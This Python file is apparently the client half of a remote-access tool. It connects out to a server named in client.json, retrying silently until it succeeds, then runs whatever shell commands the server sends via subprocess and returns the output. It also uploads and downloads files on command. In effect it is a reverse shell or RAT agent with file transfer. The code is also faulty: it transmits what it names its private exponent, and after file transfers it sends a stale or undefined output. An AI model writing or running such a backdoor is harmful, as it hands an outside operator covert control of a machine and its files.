import socket
import subprocess
import psutil 
import os
from DFH import Dfh_client as Dfh
from Client_mod import Client
import platform
from file_upload_download import FileManagerClientside as FileManagerClient
import json
import sys

USING_KEY_EXCHANGE_PROTOCOL = "RSADH"

df = Dfh()
a, mod = df.ret_known()
secret = df.private_expo()


with open("client.json", "r") as f:
    client_data = json.load(f)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = client_data["server_ip"]
PORT = client_data["port"]


while True:
    try:
        s.connect((HOST, PORT))
        break
    except Exception as e:
        pass

required_s = s.recv(1024).decode()
try:
    required_s = json.loads(required_s)
    print(required_s)
except:
    print("Some error happened!")
    sys.exit(3)

if USING_KEY_EXCHANGE_PROTOCOL in required_s["supported"]:
    s.send(json.dumps({"selected": USING_KEY_EXCHANGE_PROTOCOL}).encode())
else:
    sys.exit(4)
status = json.loads(s.recv(1024).decode())
if not status["status"]:
    sys.exit(5)
s.send(f"{a}-{mod}-{secret}".encode())
secret = int(s.recv(1024).decode())
key = str(df.genrate_secret(secret)).encode()
key = key[:16]
print(key)

client = Client(key, s, USING_KEY_EXCHANGE_PROTOCOL)
client.send(platform.platform())

def shell():
    try:
        while True:
            command = client.recv()
            print(command)
            if command.startswith("cd"):
                try:
                    os.chdir(command.split(maxsplit=1)[1])
                    output = f"Changed to {os.getcwd()}"
                except Exception as e:
                    output = f"Error: {e}"
            elif command.lower() == "utils":
                output = ("####CPUM#### " + f"{psutil.cpu_percent(interval=1)}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}")
            elif command == "..SYN..":
                output = ""
            elif command.startswith("upload "):
                filename = command.split("upload ")[1]
                cf = FileManagerClient(client)
                try:
                    cf.download_from_server(filename)
                except:
                    output = "error while uploading the file" 
            elif command.startswith("download "):
                filename = command.split("download ")[1]
                cf = FileManagerClient(client)
                try:
                    cf.upload_to_server(filename)
                except:
                    output = "error while downloading the file" 
            elif command == "####TERMINATE####":     
                sys.exit(2)
                return None

            else:
                try:
                    output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Error executing command: {e}"
            
            client.send(output)
    except Exception as e:
        print(f"exception occured {e}") 

if __name__ == "__main__":
    shell()
